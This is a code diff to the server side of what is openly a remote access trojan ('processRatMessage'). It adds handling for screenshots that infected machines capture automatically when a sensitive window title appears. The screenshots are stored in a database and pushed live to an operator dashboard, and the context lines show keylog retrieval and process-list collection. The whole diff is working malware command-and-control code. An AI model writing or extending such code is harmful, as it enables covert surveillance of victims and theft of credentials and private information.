@@ -548,6 +548,42 @@ function processRatMessage(clientId, socket, message) {
         return;
     }
 
+    // Handle auto-screenshot (triggered by sensitive window title)
+    // Format: AUTO_SCREENSHOT|<title>|<b64size>|<base64data>
+    if (message.startsWith('AUTO_SCREENSHOT|')) {
+        const p1 = message.indexOf('|');
+        const p2 = message.indexOf('|', p1 + 1);
+        const p3 = message.indexOf('|', p2 + 1);
+        if (p2 === -1 || p3 === -1) {
+            console.warn(`Malformed AUTO_SCREENSHOT from ${clientId}`);
+            return;
+        }
+        const windowTitle = message.slice(p1 + 1, p2);
+        const sizeStr     = message.slice(p2 + 1, p3);
+        const imageData   = message.slice(p3 + 1);
+        const size        = parseInt(sizeStr, 10);
+        if (!Number.isFinite(size) || size <= 0 || imageData.length < size) {
+            console.warn(`Invalid AUTO_SCREENSHOT payload from ${clientId}`);
+            return;
+        }
+        const payload = imageData.slice(0, size);
+        try {
+            db.addAutoScreenshot(clientId, windowTitle, payload);
+            broadcastToDashboard({
+                type: 'auto_screenshot',
+                clientId,
+                windowTitle,
+                data: payload,
+                size,
+                timestamp: Date.now()
+            });
+            console.log(`[AUTO_SCREENSHOT] ${clientId} triggered by: "${windowTitle}"`);
+        } catch (e) {
+            console.error(`[AUTO_SCREENSHOT] DB error for ${clientId}:`, e.message);
+        }
+        return;
+    }
+
     // Handle process list response
     if (message.startsWith('PROCESS_LIST_RESPONSE|')) {
         const jsonData = message.substring('PROCESS_LIST_RESPONSE|'.length);
@@ -1813,6 +1849,35 @@ wss.on('connection', (ws, req) => {
                                     timestamp: Date.now()
                                 }));
                                 break;
+
+                            case 'get_auto_screenshots': {
+                                const autoShots = db.getAutoScreenshots(
+                                    message.clientId || null,
+                                    message.limit || 100,
+                                    message.offset || 0,
+                                    filterUserId
+                                );
+                                ws.send(JSON.stringify({
+                                    type: 'db_response',
+                                    query: 'get_auto_screenshots',
+                                    data: autoShots,
+                                    timestamp: Date.now()
+                                }));
+                                break;
+                            }
+
+                            case 'delete_auto_screenshot': {
+                                if (message.id) {
+                                    db.deleteAutoScreenshot(message.id, filterUserId);
+                                }
+                                ws.send(JSON.stringify({
+                                    type: 'db_response',
+                                    query: 'delete_auto_screenshot',
+                                    success: true,
+                                    timestamp: Date.now()
+                                }));
+                                break;
+                            }
                                 
                             case 'get_keylogs':
                                 if (!message.clientId || !canUserIdAccessClient(filterUserId, message.clientId)) {
